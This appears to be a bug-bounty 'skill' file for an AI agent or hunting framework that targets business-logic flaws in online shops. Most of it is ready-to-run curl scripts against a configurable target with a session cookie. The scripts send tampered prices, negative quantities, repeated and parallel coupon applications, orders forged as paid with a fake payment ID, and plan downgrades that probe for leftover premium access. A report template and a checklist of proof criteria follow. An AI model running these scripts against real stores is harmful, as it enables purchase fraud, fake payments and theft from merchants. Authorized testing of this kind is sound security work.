---
name: k1nzr3c0n-hunt-business-logic
description: "Business Logic vulnerability hunting skill. Covers coupon race-stacking, negative quantity/price, decimal overflow, client-side price trust, webhook bypass, order manipulation, discount abuse. All tests require actual financial impact proof — not theoretical."
tags: [business-logic, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Business Logic Flaws

> **Financial proof required**: must show actual money-related impact (free items, overpayment, fraud).
> **Body-diff rule**: price change requires different charge amount in response, not just 200 OK.

---

## Crown Jewels

```
Priority 1 — Purchase item for $0 or negative price (actual transaction)
Priority 2 — Coupon code stacking / unlimited application
Priority 3 — Race condition: apply discount/coupon multiple times simultaneously
Priority 4 — Negative quantity: cart total goes negative → credit/refund
Priority 5 — Skip payment step: complete order without payment verification
```

---

## Phase 0 — Map Business Flow

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_bizlogic_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

RUNS_BASE="/app/runs"
# Find e-commerce/payment flows
grep -rhoP 'https?://[^\s"]+(?:cart|checkout|payment|order|purchase|coupon|discount|promo|price|invoice|subscription|plan|upgrade|billing|wallet|credit|balance|refund|transfer)' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/bizlogic_endpoints.txt" | head -20

# Find price/amount fields in JS
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"
[ -d "$JS_DIR" ] && \
  grep -hoP '(?:price|amount|total|quantity|count|limit|discount|coupon)["\s:=]+[0-9"\x27]' \
    "$JS_DIR"/*.js 2>/dev/null | sort -u | head -20
```

## Phase 1 — Price Manipulation

```bash
echo "=== Client-Side Price Manipulation ==="
CHECKOUT_EP="${CHECKOUT_ENDPOINT:-https://${TARGET}/api/cart/checkout}"
SESSION_COOKIE="${SESSION_COOKIE:-}"

# Method 1: Change price in POST body
curl -sk -X POST "$CHECKOUT_EP" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "PRODUCT_ID", "price": 0.01, "quantity": 1}]}' \
  | python3 -m json.tool 2>/dev/null | head -10

# Method 2: Negative price
curl -sk -X POST "$CHECKOUT_EP" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "PRODUCT_ID", "price": -99.99, "quantity": 1}]}' \
  | python3 -m json.tool 2>/dev/null | head -10

# Method 3: Negative quantity
curl -sk -X POST "$CHECKOUT_EP" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "PRODUCT_ID", "price": 99.99, "quantity": -1}]}' \
  | python3 -m json.tool 2>/dev/null | head -10

# Method 4: Zero quantity with discount
curl -sk -X POST "$CHECKOUT_EP" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "PRODUCT_ID", "quantity": 0}], "discount": 100}' \
  | python3 -m json.tool 2>/dev/null | head -10

# Method 5: Decimal overflow (0.001 cents)
curl -sk -X POST "$CHECKOUT_EP" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "PRODUCT_ID", "price": 0.001, "quantity": 1}]}' \
  | python3 -m json.tool 2>/dev/null | head -10
```

## Phase 2 — Coupon / Discount Abuse

```bash
echo "=== Coupon & Discount Abuse ==="
COUPON_EP="${COUPON_ENDPOINT:-https://${TARGET}/api/coupon/apply}"

# Method 1: Apply same coupon multiple times
COUPON="${TEST_COUPON:-SAVE10}"
for I in $(seq 1 5); do
  RESP=$(curl -sk -X POST "$COUPON_EP" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -H "Content-Type: application/json" \
    -d "{\"coupon\": \"${COUPON}\"}")
  DISCOUNT=$(echo "$RESP" | grep -oP '"discount":\s*[0-9.]+' | head -1)
  echo "  Apply $I: $DISCOUNT"
done

# Method 2: Stack multiple different coupons
for COUPON_CODE in SAVE10 PROMO20 WELCOME15 SUMMER25; do
  curl -sk -X POST "$COUPON_EP" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -H "Content-Type: application/json" \
    -d "{\"coupon\": \"${COUPON_CODE}\"}" | grep -oP '"discount":\s*[0-9.]+' | head -1 \
    | xargs echo "  ${COUPON_CODE}:"
done

# Method 3: Race condition (parallel apply)
echo ""
echo "Race condition: applying coupon ${COUPON} 10 times simultaneously..."
for I in $(seq 1 10); do
  curl -sk -X POST "$COUPON_EP" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -H "Content-Type: application/json" \
    -d "{\"coupon\": \"${COUPON}\"}" &
done
wait
echo "Check cart total: should only have ONE coupon applied"
```

## Phase 3 — Skip Payment / Workflow Bypass

```bash
echo "=== Payment Flow Bypass ==="

# Test direct order creation without payment
ORDER_EP="https://${TARGET}/api/orders/create"
curl -sk -X POST "$ORDER_EP" \
  -H "Cookie: ${SESSION_COOKIE:-}" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "PRODUCT_ID", "quantity": 1}], "payment_status": "paid", "payment_id": "fake_payment_123"}' \
  | python3 -m json.tool 2>/dev/null | head -10

# Skip straight to confirmation step
CONFIRM_EP="https://${TARGET}/api/orders/PENDING_ORDER_ID/confirm"
curl -sk -X POST "$CONFIRM_EP" \
  -H "Cookie: ${SESSION_COOKIE:-}" | head -5

# Replay completed order with higher quantity
COMPLETED_ORDER_ID="${COMPLETED_ORDER_ID:-}"
[ -n "$COMPLETED_ORDER_ID" ] && \
  curl -sk -X POST "${ORDER_EP}" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -H "Content-Type: application/json" \
    -d "{\"order_id\": \"${COMPLETED_ORDER_ID}\", \"quantity\": 100}"
```

## Phase 4 — Limit Bypass (Free Tier / Trial Abuse)

```bash
echo "=== Free Tier / Limit Bypass ==="

# Test storage/API limits
for SIZE in 10 100 1000 10000; do
  RESP=$(curl -sk -X POST "https://${TARGET}/api/data" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -H "Content-Type: application/json" \
    -d "{\"data\": \"$(head -c $SIZE /dev/urandom | base64 -w0)\"}")
  echo "  Size ${SIZE}B: $(echo $RESP | grep -oP 'error|limit|quota|exceeded' | head -1 || echo 'accepted')"
done

# Plan downgrade with active premium features
curl -sk -X PUT "https://${TARGET}/api/subscription" \
  -H "Cookie: ${SESSION_COOKIE:-}" \
  -H "Content-Type: application/json" \
  -d '{"plan": "free"}' | head -5
curl -sk "https://${TARGET}/api/premium/features" \
  -H "Cookie: ${SESSION_COOKIE:-}" | head -5
echo "  Does premium feature still work after downgrade?"
```

## Gate 0

```bash
echo "=== Business Logic Gate 0 ==="
echo "  □ Price change: different charge amount in server response (not just client display)"
echo "  □ Coupon stacking: total discount ACCUMULATED beyond single use"
echo "  □ Race condition: server processed coupon multiple times (check DB/audit log)"
echo "  □ Payment skip: actual order FULFILLED without payment (item shipped/delivered)"
echo "  □ Test amount: use minimum real-money test ($0.01 if allowed, gift card)"
echo "  □ Never test with amounts that could cause real financial loss"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Business Logic: Purchase [product] for $0.01 by manipulating price parameter in checkout request
Coupon race condition on [/api/coupon/apply] allows stacking single-use coupon [SAVE10] reducing order to $0
Negative quantity in cart allows ordering -1 items, generating [amount] account credit
```
